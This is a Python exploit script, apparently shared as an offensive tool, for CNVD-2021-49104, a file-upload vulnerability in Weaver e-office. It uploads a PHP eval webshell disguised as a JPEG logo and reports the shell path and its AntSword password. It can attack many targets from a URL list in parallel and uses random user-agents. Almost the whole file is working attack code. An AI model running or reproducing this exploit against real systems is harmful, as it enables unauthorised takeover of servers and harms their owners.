#! /usr/bin/env python
# -*- encoding: utf-8 -*-
import requests
import sys
from time import time
import random
import urllib3
import base64
from urllib import parse
from argparse import ArgumentParser
import threadpool


#python3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]


#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#getshell函数
def exp(url):
	#防止url格式混乱，增加容错率
	url=parse.urlparse(url)
	url=url.scheme + '://' + url.netloc
	vuln_url=url + '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo'

	#添加随机ua头	
	headers = {
	'User-Agent': get_ua(),
	'Accept-Language':'zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6',
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'Accept-Encoding':'gzip, deflate',
	'Content-Type':'multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4',
	}

	data ='''
--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="m.php"
Content-Type: image/jpeg

<?php
$do = 'todo';
$$do = $_POST['m2'];
eval(`/***123***/`.$todo);
?>
--e64bdf16c554bbc109cecef6451c26a4--'''
	try:
		r=requests.post(url=vuln_url,headers=headers,data=data,verify=False,timeout=5)
		#poc
		if r.status_code == 200 and "logo-eoffice" in r.text:
			print("\033[32m[+] 目标 {} 成功上传 \033[0m".format(url))
			print("\033[32m[+] webshell地址：{}/images/logo/logo-eoffice.php \033[0m".format(url))
			print("\033[32m[+] 蚁剑连接密码：m2 \033[0m".format(url))
		else:
			print("\033[31m[-]%s 不存在漏洞\033[0m" %url)
	except:
		print("\033[31m[-]%s request false!\033[0m" %url)


#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		works.append(i)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(exp, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == "__main__":
	show = r'''

 _____  _   _ _   _______        _____  _____  _____  __          ___  _____  __  _____    ___ 
/  __ \| \ | | | | |  _  \      / __  \|  _  |/ __  \/  |        /   ||  _  |/  ||  _  |  /   |
| /  \/|  \| | | | | | | |______`' / /'| |/' |`' / /'`| |______ / /| || |_| |`| || |/' | / /| |
| |    | . ` | | | | | | |______| / /  |  /| |  / /   | |______/ /_| |\____ | | ||  /| |/ /_| |
| \__/\| |\  \ \_/ / |/ /       ./ /___\ |_/ /./ /____| |_     \___  |.___/ /_| |\ |_/ /\___  |
 \____/\_| \_/\___/|___/        \_____/ \___/ \_____/\___/         |_/\____/ \___/\___/     |_/
                                                                                               
                                                                                               
					 
					CNVD-2021-49104_exp by m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='CNVD-2021-49104_exp By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="filename; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	start=time()
	if url != None and filename == None:
		exp(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成，用时%ds' %(end-start))